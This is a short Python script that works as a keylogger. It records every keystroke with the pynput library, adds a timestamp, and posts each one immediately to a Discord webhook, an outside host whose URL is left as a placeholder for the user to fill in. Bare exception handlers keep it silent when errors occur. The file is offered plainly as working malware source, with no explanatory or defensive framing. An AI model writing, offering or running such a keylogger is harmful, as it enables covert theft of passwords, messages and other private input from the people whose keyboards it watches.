import os
from pynput import keyboard
from datetime import datetime
import requests

WEBHOOK_URL = "your webhook link"

def send_to_discord(content):
    data = {"content": content}
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=3)
    except:
        pass

def write_log(key):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log = f"[{now}] {key.char}"
    except AttributeError:
        log = f"[{now}] [{key}]"
    send_to_discord(log)

try:
    with keyboard.Listener(on_press=write_log) as listener:
        listener.join()
except:
    pass